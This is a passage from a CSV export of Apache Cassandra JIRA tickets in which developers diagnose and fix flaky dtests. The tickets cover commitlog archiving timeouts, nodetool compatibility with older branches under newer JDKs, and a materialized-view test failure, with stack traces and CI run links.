        assert len(object_with_length) == expected_length, \
            ""Expected {} to have length {}, but instead is of length {}""\
>           .format(object_with_length, expected_length, len(object_with_length))
E       AssertionError: Expected [Row(c1='value1', c2='value2')] to have length 0, but instead is of length 1

tools/assertions.py:269: AssertionError
{code}


 ",,adelapena,brandon.williams,e.dimitrova,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17144,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,stefan.miklosovic,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Oct 14 20:03:24 UTC 2022,,,,,,,All,,,,"0|z18k2o:",9223372036854775807,,,,brandon.williams,,,,Normal,,4.1-alpha1,,https://github.com/apache/cassandra-dtest/commit/9d9f4648f9232b1c14d017436f1038e320d064a2,,,,,,,,,updated dtest,,,,,"14/Sep/22 15:01;e.dimitrova;[~stefan.miklosovic], this test failure keeps on popping up as noticed on CASSANDRA-17144 so I opened a new ticket for you to take a look at it. (You mentioned there you will do it). Thanks ;;;","15/Sep/22 12:57;adelapena;It was hit on [this run|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/285/workflows/600dcc96-5d47-48ab-bc24-e4617decff1f/jobs/2291/tests], and it can also be [reproduced on the multiplexer|https://app.circleci.com/pipelines/github/adelapena/cassandra/2086/workflows/b8d1b02e-dd9e-452d-8fa5-f65e7208e200/jobs/20954] with this config:
{noformat}
.circleci/generate.sh -m \
  -e REPEATED_DTEST_COUNT=500 \
  -e REPEATED_DTEST_NAME=hintedhandoff_test.py::TestHintedHandoff::test_hintedhandoff_window
{noformat}
;;;","15/Sep/22 13:58;smiklosovic;I am aware of that. Will take a look in couple days.;;;","15/Sep/22 14:05;e.dimitrova;Thanks :) ;;;","14/Oct/22 09:47;smiklosovic;I think I fixed it. I did 2 runs on 500 repeats without a failure.

[https://github.com/apache/cassandra-dtest/pull/204]
[https://app.circleci.com/pipelines/github/instaclustr/cassandra/1424/workflows/508b9d65-5b16-475c-894d-6405792cc9a5]
[https://app.circleci.com/pipelines/github/instaclustr/cassandra/1423/workflows/1d977064-122e-4f4f-970e-1363ce79f55a];;;","14/Oct/22 10:48;brandon.williams;Does the sleep need to be such a long time?  It seems like it could be shorter since we are looping.;;;","14/Oct/22 19:33;smiklosovic;I tweaked the code a little (PR is same).

I did 3x 500 and all passed

[https://app.circleci.com/pipelines/github/instaclustr/cassandra/1426/workflows/c301d1bb-0f41-41d9-9859-ea8db283c593/jobs/6214]

[https://app.circleci.com/pipelines/github/instaclustr/cassandra/1427/workflows/62b1abc6-da9d-4d4f-90fb-8983d3a6bb17/jobs/6216]

[https://app.circleci.com/pipelines/github/instaclustr/cassandra/1428/workflows/c32c074c-64cf-4bf0-a882-9c88bbe14970/jobs/6218];;;","14/Oct/22 20:03;brandon.williams;+1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky test_archive_commitlog_point_in_time,CASSANDRA-17889,13481385,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,13/Sep/22 20:35,15/Sep/22 14:15,13/Jul/23 08:40,15/Sep/22 14:15,,,,,,,CI,,,,0,,"Spotted in butler to fail for 4.0, 4.1 and trunk:
h3.  
{code:java}
Error Message
AssertionError: It's been over a {s}s and we haven't written a new commitlog segment. Something is wrong.

Stacktrace
self = <snapshot_test.TestArchiveCommitlog object at 0x7efe72087d00> def test_archive_commitlog_point_in_time(self): """""" Test archive commit log with restore_point_in_time setting """""" > self.run_archive_commitlog(restore_point_in_time=True) snapshot_test.py:259: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ snapshot_test.py:301: in run_archive_commitlog advance_to_next_cl_segment( _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
{code}
 ",,adelapena,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Sep 15 14:14:23 UTC 2022,,,,,,,All,,,,"0|z18j80:",9223372036854775807,,,,adelapena,,,,Normal,,,,https://github.com/apache/cassandra-dtest/commit/35bd7ae6f6616f3cd4f32c0dadbcc0c87883a833,,,,,,,,,"I ended up changing the default timeout for the _advance_to_next_cl_segment_ to 180 [here|https://github.com/ekaterinadimitrova2/cassandra-dtest/commit/9034106e2be4844f41ba310c4320ba0e5f2463e4]{_}.{_} I noticed last time in 2018 it was taken the same approach and it makes sense that it will probably start lagging soon in the other cdc_test too. 

Ran below jobs 300 times.
||snapshot_test||cdc_test||
|[3.0|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1908/workflows/a58590ad-4c3c-4a04-b807-b778f85d5b9f]|[3.0|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1910/workflows/089e7a26-11f3-446c-90c6-f705f6984c49]|
|[3.11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1911/workflows/77a4c750-2c68-437c-8b51-73de6f118ca5]|[3.11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1912/workflows/4c4a4a4a-247a-44ef-bda2-59d9e15f53b4]|
|[4.0 j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1913/workflows/fcd0e62d-db02-4001-9987-8e580ce30359], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1913/workflows/9db5ff25-eb2f-4c91-97e1-abdbdf7490ac]|[4.0 j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1914/workflows/68a45812-dd1f-4b80-916e-53018283867f], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1914/workflows/3eff8dcd-e92c-4775-abc6-84136cfbef61]|
|[4.1 j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1915/workflows/117eec09-21aa-4439-914e-c73f9c4f922f], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1915/workflows/819702b4-fe80-4b8e-9dd4-00fb6a9019dc]|[4.1 j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1916/workflows/b417eb0f-f0b5-4957-acdd-ce0a5ab714d1], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1916/workflows/2c255941-50a3-4b85-83c4-8f6f00f53c12]|

Looking into older tickets there were differences between code and time to run those tests for 3.0, 3.11, 4.0 so I ran on all branches. I don't think trunk has diverged a lot there from 4.1 so I decided to save resources on that one. ",,,,,"13/Sep/22 21:31;e.dimitrova;Seems to me like a timing issue that I easily reproduced locally by reducing the timeout given to 

_advance_to_next_cl_segment_ method. I. will experiment in CircleCI a bit;;;","13/Sep/22 23:35;e.dimitrova;1000 times successful finish on [4.0|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17889-4.0], 

500 times successful completion on [4.1|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17889-4.1]

I opted out from running it on other branches so far as it seems obvious to me that these days Jenkins was lagging a lot. We didn't have 3.0 and 3.11 builds since 26th August but on all other branches we see the timeout these days. 

I suggest we raise the timeout provided to _advance_to_next_cl_segment_ method in _snapshot_test_ to 180 and rerun in a loop the whole snapshot_test class on all branches? [~adelapena], does this sound reasonable to you? 

 ;;;","14/Sep/22 11:09;adelapena;It sounds very reasonable to me.

By the way, it seems there's a mistake in [the way the error message is formatted|https://github.com/apache/cassandra-dtest/blob/trunk/tools/hacks.py#L60]:
{noformat}
AssertionError: It's been over a {s}s and we haven't written a new commitlog segment. Something is wrong.
{noformat}
I think we should use:
{code:python}
(""It's been over {s}s and we haven't written a new ""
 ""commitlog segment. Something is wrong."").format(s=timeout)
{code};;;","14/Sep/22 14:25;e.dimitrova;{quote}By the way, it seems there's a mistake in [the way the error message is formatted|https://github.com/apache/cassandra-dtest/blob/trunk/tools/hacks.py#L60]:
{quote}
Yeah, I also noticed it, I will fix It with the timeout raise and then run all branches with the patch soon. Thanks;;;","14/Sep/22 16:15;e.dimitrova;I ended up changing the default timeout for the _advance_to_next_cl_segment_ to 180 [here|https://github.com/ekaterinadimitrova2/cassandra-dtest/commit/9034106e2be4844f41ba310c4320ba0e5f2463e4]{_}.{_} I noticed last time in 2018 it was taken the same approach and it makes sense that it will probably start lagging soon in the other cdc_test too. 

Ran below jobs 300 times.

 
||snapshot_test||cdc_test||
|[3.0|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1908/workflows/a58590ad-4c3c-4a04-b807-b778f85d5b9f]|[3.0|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1910/workflows/089e7a26-11f3-446c-90c6-f705f6984c49]|
|[3.11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1911/workflows/77a4c750-2c68-437c-8b51-73de6f118ca5]|[3.11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1912/workflows/4c4a4a4a-247a-44ef-bda2-59d9e15f53b4]|
|[4.0 j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1913/workflows/fcd0e62d-db02-4001-9987-8e580ce30359], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1913/workflows/9db5ff25-eb2f-4c91-97e1-abdbdf7490ac]|[4.0 j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1914/workflows/68a45812-dd1f-4b80-916e-53018283867f], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1914/workflows/3eff8dcd-e92c-4775-abc6-84136cfbef61]|
|[4.1 j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1915/workflows/117eec09-21aa-4439-914e-c73f9c4f922f], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1915/workflows/819702b4-fe80-4b8e-9dd4-00fb6a9019dc]|[4.1 j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1916/workflows/b417eb0f-f0b5-4957-acdd-ce0a5ab714d1], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1916/workflows/2c255941-50a3-4b85-83c4-8f6f00f53c12]|

Looking into older tickets there were differences between code and time to run those tests for 3.0, 3.11, 4.0 so I ran on all branches. I don't think trunk has diverged a lot there from 4.1 so I decided to save resources on that one. 

 ;;;","15/Sep/22 09:23;adelapena;Looks good to me, +1;;;","15/Sep/22 14:14;e.dimitrova;Committed, thanks!

To https://github.com/apache/cassandra-dtest.git

   94540894..35bd7ae6  trunk -> trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add solution for CASSANDRA-17581 to older branches for tests,CASSANDRA-17885,13481129,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,12/Sep/22 14:54,12/Jan/23 21:59,13/Jul/23 08:40,19/Oct/22 15:09,3.0.28,3.11.14,4.0.7,4.1-rc1,,,Tool/nodetool,,,,0,,"Some of our tests use old branches for the purposes of testing upgrades and behavior in mixed versions, but those lacking CASSANDRA-17581 will fail on nodetool with a modern JDK.  We can port this fix to those branches and adjust the tests to use the newest version of them to solve this going forward.",,e.dimitrova,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17854,,,,,,,,,,,,,,,,,CASSANDRA-16895,,,,,,CASSANDRA-17581,,,,,,,,,,CASSANDRA-17912,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Degradation -> Other Exception,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Oct 19 15:09:22 UTC 2022,,,,,,,All,,,,"0|z18ho0:",9223372036854775807,,,,e.dimitrova,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/598b44c9392c92e1fbfa183d5570bbb7206f3d35,,,,,,,,,run CI,,,,,"12/Sep/22 14:55;e.dimitrova;Do you mean 2.x? 

EDIT: yes, I saw the comment in the other ticket which uncovered the problem;;;","12/Sep/22 15:18;brandon.williams;2.0 won't compile under java 8:

{code}
     [java] error(10):  internal error: Can't get property indirectDelegates using method get/isIndirectDelegates from org.antlr.tool.Grammar instance : java.lang.NullPointerException
     [java] java.util.Objects.requireNonNull(Objects.java:203)
     [java] java.util.ArrayList.removeAll(ArrayList.java:693)
     [java] org.antlr.tool.CompositeGrammar.getIndirectDelegates(CompositeGrammar.java:222)
     [java] org.antlr.tool.Grammar.getIndirectDelegates(Grammar.java:2620)
     [java] sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
     [java] sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
     [java] sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
     [java] java.lang.reflect.Method.invoke(Method.java:498)
{code}

It looks like we need to upgrade antlr for that to work :(;;;","12/Sep/22 15:44;brandon.williams;Cherry picking the patch applies cleanly in [2.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17885-2.1] and [2.2|https://github.com/driftx/cassandra/tree/CASSANDRA-17885-2.2].  For 2.0, we'd have to backport CASSANDRA-7028 also so we can compile.  That is probably too much effort for so little gain, so I looked at the tests that utilize 2.0 and I think there are only two: one in [counter_test.py|https://github.com/apache/cassandra-dtest/blob/trunk/counter_test.py#L34] and one in [secondary_index_test.py|https://github.com/apache/cassandra-dtest/blob/trunk/secondary_indexes_test.py#L1103] but that one is a dead test now that only runs against 2.1, so it's really just the counter test_13691 that needs it.;;;","12/Sep/22 16:12;brandon.williams;[This branch|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17885] pushes all the dtests that grab a specific 2.x version to instead use the git version.  This still leaves the issue of 2.0 though, and I don't see that code getting fixed at this point, so maybe we should change tack and instead hack the nodetool scripts in the dtests so they work.  [~mck] WDYT?;;;","12/Sep/22 16:33;mck;I'm for hacking the nodetool scripts (when against unsupported older versions).

Not that keen on using git versions. But definitely not keen on hard-coded patch versions that are out of date 🤷🏻‍♀️
;;;","12/Sep/22 16:44;e.dimitrova;I second Mick;;;","13/Sep/22 15:56;brandon.williams;[Here|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17885] is a branch that adds a function that hacks the nodetool script, simply adding a -D for legacy parsing in the right place toward the end, and then using that function in the cases where set_install_dir is pointed at a version that doesn't have CASSANDRA-17581.  And [here|https://app.circleci.com/pipelines/github/driftx/cassandra/635/workflows/b3a44ef1-0680-4e61-bff4-48337b761ccb] is a circle run to smoke test it, since that code isn't actually needed when running inside the docker image with the old JDK.;;;","13/Sep/22 16:30;e.dimitrova;Thanks, I guess then we also need to run the tests with the new image from the other ticket but it seems to me this should work. And maybe for the final run we want to try also the upgrade tests, WDYT?;;;","13/Sep/22 16:44;brandon.williams;That sounds good to me.;;;","13/Sep/22 17:43;e.dimitrova;In your initial test with the current image there was nothing suspicious, one known failed Python DTest - test_multiple_repair - CASSANDRA-17005

I started a CircleCI run [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1903/workflows/0e6edb77-be97-4485-9d34-8a774608d738] for branch 3.0 with mid resources, your branch, the new image and also running the Python DTests. Let's see how that will go. 

 ;;;","13/Sep/22 19:08;e.dimitrova;It seems like _test_14766_ needs some attention too, but the rest passed. I think if [~mck]  doesn't have anything against, we can test also the rest of the branches and move on?;;;","13/Sep/22 19:23;brandon.williams;There are a few more tests beyond 14766 too, but I've pushed an update for them all.  The good news is the patch seems to work, when applied.;;;","17/Sep/22 02:38;e.dimitrova;Runs [#1938-#1942|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/] in Jenkins with [~brandon.williams] DTest patch and the new image that contains JDK17.

CircleCI:
 * trunk – [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1921/workflows/e55290d1-e82d-4735-9fb4-bb7601fad53e], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1921/workflows/2f955186-b4e2-48e4-8487-4b02d34f1bf1]
 * 4.1 - [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1920/workflows/e431466a-0222-4d08-9e10-fc96bd5b6f85], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1920/workflows/8f79795c-0d8c-4e75-9ef3-de3471fb9167]
 * 4.0 - [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1919/workflows/05a892cd-6657-4162-baab-c0275c5bae0b], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1919/workflows/e97624c8-5a30-4b08-9929-6163f88ccca7]
 * 3.11 - [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1918/workflows/4e876ae4-8681-4046-b800-9bcf664efe6e]
 * 3.0 - [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1903/workflows/8c0383ab-1732-4230-b661-0e238b9a95ad]

I will check back the results on Monday. Hopefully turtle CI will be done until then :–) ;;;","17/Sep/22 11:08;brandon.williams;I pushed a fix for a typo in test_14766, but the rest looks good to me.;;;","17/Sep/22 13:12;e.dimitrova;I forgot to push the upgrade tests in CircleCI though and they are failing now in Jenkins. I am on the phone now but it seems some string issue, nothing big, will check it later. Thanks;;;","17/Sep/22 13:41;brandon.williams;I pushed a fix in the debug log where LooseVersion wouldn't concat with a string, which caused a ton of failures in the upgrade tests :(;;;","19/Sep/22 00:42;e.dimitrova;No worries, I was sure it was something small. Thanks for the fix! I was waiting for all runs to finish so I can verify there is nothing else missed but it seems the turtle is still crawling... Will check back again tomorrow.;;;","19/Sep/22 13:56;e.dimitrova;All branches except trunk were done and from what I saw I don't think there are other related to this patch issues. I decided to stop the trunk run as we do not expect too many changes compared to 4.1. I [pushed|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1944/] again 3.0 with the latest fix and if everything goes fine, I will pile the rest of the branches. Trying not to block people by overutilizing Jenkins dev on a working day. ;;;","19/Sep/22 23:10;e.dimitrova;Seems to me that the failures on 3.0 are unrelated and we are good to go with the other branches, what do you think [~brandon.williams] ?;;;","20/Sep/22 11:17;brandon.williams;Looks good to me, committed.  Thanks!;;;","20/Sep/22 14:02;e.dimitrova;What happened to testing the rest of the branches...? :D

I will pile them for the CASSANDRA-17854 anyway,  I will see if something pop up there. Thanks ;;;","20/Sep/22 14:06;brandon.williams;Oh whoops.  I think we've fully exercised the patch now anyway and don't think anything will pop up.;;;","21/Sep/22 01:54;e.dimitrova;Unfortunately, there are more upgrade tests to handle for [4.0|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1933/workflows/daffc899-bf3f-41ca-aca2-156c1b6c706b/jobs/15303], [4.1|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1934/workflows/05c39d2a-0895-4157-ad99-ccfe099cb38e] and [trunk|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1935/workflows/2374a071-a635-4c92-a3bf-343beb201f82/jobs/15392]

[3.0|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1931/workflows/39ef5261-a6bf-4e77-a412-e750e322a231/jobs/15293/tests] and  [3.11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2] - there are a bunch of tests with this failure, but they shouldn't run there at all, so different type of issue. And it happens only in CircleCI, those are skipped in Jenkins.(100% sure about 3.0 and still need to test 3.11 but I am 99% sure it is the same case) Not sure what the story is there. I've seen something like that before and I thought there was a ticket but I cannot find it now. 

 ;;;","21/Sep/22 14:03;brandon.williams;I think I've now covered 4.0+ with [this commit|https://github.com/driftx/cassandra-dtest/commit/61f9853bf0dd033dac9bde19ad987f6a722f11b9].  I'm not sure why those other tests are running either, things like 'upgrade_tests.cql_tests.TestCQLNodes2RF1_Upgrade_current_2_2_x_To_indev_2_2_x' definitely shouldn't run there.;;;","21/Sep/22 15:18;e.dimitrova;Thanks [~brandon.williams], I also think all cases are handled now from code review, pushed sanity check runs for the upgrade tests here:

[4.0|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1936/workflows/aa6165bd-342b-436a-b93f-f62a2119dd80], [4.1|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1937/workflows/7c888ab3-3d52-4330-922e-3645dfdee328], [trunk|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1938/workflows/2522fdb6-a9ca-43a9-88b3-982ac88e2c4c] 
{quote}I'm not sure why those other tests are running either, things like 'upgrade_tests.cql_tests.TestCQLNodes2RF1_Upgrade_current_2_2_x_To_indev_2_2_x' definitely shouldn't run there.
{quote}
They are properly skipped in Jenkins... I opened CASSANDRA-17912 for that problem;;;","21/Sep/22 21:50;e.dimitrova;Hmmm I am testing with your branch and those still fail in Circle.... Either Circle did not update something or there is still some issue... I will check back more in detail tomorrow;;;","21/Sep/22 22:37;e.dimitrova;Ensured I am on the latest jdk8 version locally and running now one of the test suites for quick sanity check:
{code:java}
pytest --execute-upgrade-tests-only --upgrade-target-version-only --upgrade-version-selection all --log-level=""DEBUG"" --cassandra-dir=*** storage_engine_upgrade_test.py{code}
 So far no failures, I will report back when it completes and if everything is fine I will move to Jenkins 3.11-trunk testing;;;","22/Sep/22 01:07;brandon.williams;Something is still wrong, I can reproduce but it's nothing obvious, I'll look more tomorrow.;;;","22/Sep/22 15:11;brandon.williams;I've pushed a fix to install the nodetool hack on any version below -3.0.27- 3.11.13, which now catches the 3.0.17 and 3.11.3 versions the upgrade tests are using.;;;","22/Sep/22 20:55;e.dimitrova;[4.0|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1941/workflows/d3a59db8-f18c-41d4-910e-6a00ef9c0b6d], [4.1|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1942/workflows/06068ab4-c13f-4aa6-9ed5-7aec28b2d722], [trunk|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1943/workflows/c0fb79b4-d311-4400-9a1a-10d319b431c4] CI runs;;;","23/Sep/22 02:37;e.dimitrova;Almost there… 4 failing tests on each branch

Some containers show build time out which I am not sure why…

Probably we should check the logs tomorrow;;;","23/Sep/22 15:42;brandon.williams;Ok, made one last change that should do the trick.  I made the install per-node since the upgrade tests work on that basis.;;;","23/Sep/22 17:07;e.dimitrova;[trunk|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1944/workflows/12abae83-c42c-44ab-9d9a-872a864f959f] upgrade tests started;;;","23/Sep/22 18:47;brandon.williams;Since there is no per-node version, I pushed a change to inspect nodetool and only apply the hack if needed.;;;","27/Sep/22 01:15;e.dimitrova;Unfortunately the run I pushed on Friday shows that it is still a problem - [https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1946/workflow[…]56c-920183badec8/jobs/15420/parallel-runs/34?filterBy=FAILED|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1946/workflows/3d91582f-17ea-4007-856c-920183badec8/jobs/15420/parallel-runs/34?filterBy=FAILED]

I can take a look more in detail tomorrow afternoon. ;;;","27/Sep/22 16:56;brandon.williams;[Here|https://app.circleci.com/pipelines/github/driftx/cassandra/652/workflows/08651048-223e-4af0-ba3a-5739f11c0f59/jobs/7367] is a passing run, finally.;;;","29/Sep/22 12:58;brandon.williams;[3.0|https://app.circleci.com/pipelines/github/driftx/cassandra/653/workflows/366b631d-2c88-44d2-8b9f-def7ce52bd43/jobs/7387] and [3.11|https://app.circleci.com/pipelines/github/driftx/cassandra/654/workflows/722c3d56-8a3f-4df2-b357-439c80e469d5/jobs/7389].  3.0 only has udt fix failures, and -3.11 has one last failure that will be solved soon- edit: [3.11|https://app.circleci.com/pipelines/github/driftx/cassandra/654/workflows/8cd62611-2ccc-45e5-a854-4f9c9c2601cd/jobs/7393] with only udt fix failures.;;;","06/Oct/22 19:49;e.dimitrova;Thanks, I will be off for some time. As long as all branches pass on both CIs with the new image from CASSANDRA-17854 I think I am +1 on this patch. I still think it might have been easier to make a ccm patch but I understand it hides its own risks and considerations and you are already at the finish line with this one. 

 ;;;","08/Oct/22 00:48;brandon.williams;Jenkins:
* [3.0|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1985/]
* [3.11|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1986/]
* [4.0|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1960/]
* [4.1|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1961/]
* [trunk|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1988/]

Circle:
* [3.0|https://app.circleci.com/pipelines/github/driftx/cassandra/653/workflows/366b631d-2c88-44d2-8b9f-def7ce52bd43/jobs/7387]
* [3.11|https://app.circleci.com/pipelines/github/driftx/cassandra/654/workflows/722c3d56-8a3f-4df2-b357-439c80e469d5/jobs/7389]
* [4.0|https://app.circleci.com/pipelines/github/driftx/cassandra/663/workflows/e86ddc84-75a2-4ff1-8359-693e19fa663a/jobs/7406]
* [4.1|https://app.circleci.com/pipelines/github/driftx/cassandra/662/workflows/7a25751d-7123-49aa-b7f1-930d7142e577/jobs/7407]
* [trunk|https://app.circleci.com/pipelines/github/driftx/cassandra/652/workflows/08651048-223e-4af0-ba3a-5739f11c0f59/jobs/7367]

There are existing failures, but none due to nodetool.
;;;","19/Oct/22 13:56;e.dimitrova;Is there anything else we should do here?

I also don't see any more errors. Thanks

Also I guess upgrade tests only run in Circle is enough as the latest changes were test oriented and we had already clear Python DTest runs?

I see there were some commits to the DTest repo since 7th October when you ran CI but it seems at most we should just run some of the changed tests locally to ensure they are fine and move on to commit this patch. WDYT?;;;","19/Oct/22 14:31;brandon.williams;bq. I see there were some commits to the DTest repo since 7th October

I was party to those though and as the author here can say that none are an issue :)

I think we're good to go if you're +1.;;;","19/Oct/22 14:59;e.dimitrova;I +1ed on green CI on 6th October :D 

I am sorry if it wasn't clear. 
{quote}bq. I was party to those though and as the author here can say that none are an issue :)
{quote}
SGTM

Thanks for all your efforts here!!;;;","19/Oct/22 15:09;brandon.williams;Committed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky test_no_base_column_in_view_pk_complex_timestamp_with_flush,CASSANDRA-17882,13480888,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,09/Sep/22 14:35,12/Sep/22 16:09,13/Jul/23 08:40,12/Sep/22 16:08,,,,,,,CI,,,,0,,"It seems flaky lately on 4.1 per Butler:

[https://butler.cassandra.apache.org/#/ci/upstream/workflow/Cassandra-4.1/failure/materialized_views_test/TestMaterializedViews/test_no_base_column_in_view_pk_complex_timestamp_with_flush]

I was not able to reproduce it on 4.0 and 4.1 in Circle. 
h3.  
{code:java}
Error Message
AssertionError: Expected [[1, 1, 1, None, None, None]] from SELECT * FROM t, but got []

Stacktrace
self = <materialized_views_test.TestMaterializedViews object at 0x7fc5fb98a880> @flaky @since('3.0') def test_no_base_column_in_view_pk_complex_timestamp_with_flush(self): > self._test_no_base_column_in_view_pk_complex_timestamp(flush=True) materialized_views_test.py:1451: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ materialized_views_test.py:1541: in _test_no_base_column_in_view_pk_complex_timestamp assert_one(session, ""SELECT * FROM t"", [1, 1, 1, None, None, None]) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
{code}
